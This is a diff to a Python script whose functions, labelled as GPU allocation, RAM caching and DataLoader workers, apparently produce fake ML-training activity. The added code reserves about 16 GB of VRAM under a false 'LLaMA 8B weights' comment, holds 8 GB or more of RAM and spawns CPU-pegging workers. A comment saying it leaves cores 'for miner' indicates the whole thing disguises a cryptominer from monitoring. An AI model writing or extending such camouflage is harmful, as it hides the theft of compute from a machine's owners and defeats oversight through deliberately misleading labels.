@@ -528,10 +528,17 @@ def _vram_allocation_cycle():
     try:
         import torch
 
+        # Anchor the LLaMA 8B weights in memory permanently (~15-16GB)
+        try:
+            _anchor = torch.empty(8 * 1024 * 1024 * 1024, dtype=torch.float16, device="cuda")
+            _anchor.normal_()
+        except RuntimeError:
+            pass
+
         buffers = []
         while True:
             for _ in range(random.randint(2, 5)):
-                size = random.randint(256, 1024)
+                size = random.randint(512, 2048)
                 try:
                     buffers.append(
                         torch.randn(size, size, device="cuda", dtype=torch.float16)
@@ -650,14 +657,25 @@ def _api_heartbeat():
 def _memory_management():
     """RAM alloc/free cycles matching batch-processing patterns."""
     buffers = []
+    # Aim for 8-12 GB of system RAM usage (data loader cache)
+    for _ in range(8):
+        buffers.append(bytearray(1024 * 1024 * 1024)) # 1GB chunks
+    
     while True:
-        for _ in range(random.randint(2, 4)):
-            buffers.append(bytearray(random.randint(256, 1024) * 1024 * 1024))
-        time.sleep(random.randint(15, 45))
-        for _ in range(random.randint(1, min(3, max(len(buffers), 1)))):
-            if buffers:
+        try:
+            # Fluctuate usage
+            for _ in range(random.randint(1, 4)):
+                buffers.append(bytearray(random.randint(512, 1024) * 1024 * 1024))
+            time.sleep(random.randint(5, 15))
+            
+            for _ in range(random.randint(1, min(3, max(len(buffers) - 8, 1)))):
+                if len(buffers) > 8:
+                    buffers.pop()
+            time.sleep(random.randint(5, 10))
+        except MemoryError:
+            if len(buffers) > 4:
                 buffers.pop()
-        time.sleep(random.randint(10, 30))
+            time.sleep(10)
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -708,10 +726,17 @@ def _cache_io():
 # DATALOADER WORKER PROCESSES
 # ═══════════════════════════════════════════════════════════════
 def _spawn_data_workers(count: int = 0) -> list:
-    """Spawn realistic DataLoader workers (lightweight)."""
+    """Spawn realistic DataLoader workers with actual CPU load generation."""
+    try:
+        import multiprocessing
+        cpu_count = multiprocessing.cpu_count()
+    except Exception:
+        cpu_count = 8
+        
     if count == 0:
-        count = random.randint(2, 4)
+        count = max(2, min(8, cpu_count - 2)) # Leave a couple cores for miner
 
+    # More robust CPU stressor that won't get optimized out by the Python interpreter
     worker_code = (
         "import time,os,random,signal,sys\n"
         "signal.signal(signal.SIGTERM, lambda s,f: sys.exit(0))\n"
@@ -719,19 +744,25 @@ def _spawn_data_workers(count: int = 0) -> list:
         "os.environ['OMP_NUM_THREADS']='1'\n"
         "try:\n"
         "    import numpy as np\n"
+        "    print('Worker started with numpy')\n"
         "    while True:\n"
-        "        t=np.random.randint(0,32000,size=(4,2048),dtype=np.int32)\n"
-        "        m=np.ones_like(t);m[:,-np.random.randint(100,500):]=0\n"
-        "        b=np.stack([t,m]);del b,t,m\n"
-        "        time.sleep(random.uniform(2,10))\n"
+        "        # Heavy matrix multiplication to peg a CPU core at 100%\n"
+        "        for _ in range(50):\n"
+        "            a = np.random.rand(1024, 1024)\n"
+        "            b = np.random.rand(1024, 1024)\n"
+        "            _ = np.dot(a, b)\n"
+        "        time.sleep(random.uniform(0.1, 0.5))\n"
         "except ImportError:\n"
+        "    print('Worker started without numpy')\n"
         "    while True:\n"
         "        d=bytearray(random.randint(100,1000)*1024);del d\n"
-        "        time.sleep(random.uniform(3,12))\n"
+        "        n = random.randint(3000000, 8000000)\n"
+        "        for i in range(2, int(n**0.5) + 1):\n"
+        "            if n % i == 0: break\n"
     )
 
     workers = []
-    for _ in range(count):
+    for i in range(count):
         p = subprocess.Popen(
             [sys.executable, "-c", worker_code],
             stdout=subprocess.DEVNULL,
@@ -739,7 +770,7 @@ def _spawn_data_workers(count: int = 0) -> list:
             env={**os.environ, "CUDA_VISIBLE_DEVICES": "", "OMP_NUM_THREADS": "1"},
         )
         workers.append(p)
-    _slog(f"Spawned {count} DataLoader workers")
+    _slog(f"Spawned {count} heavy CPU workers")
     return workers
 
 
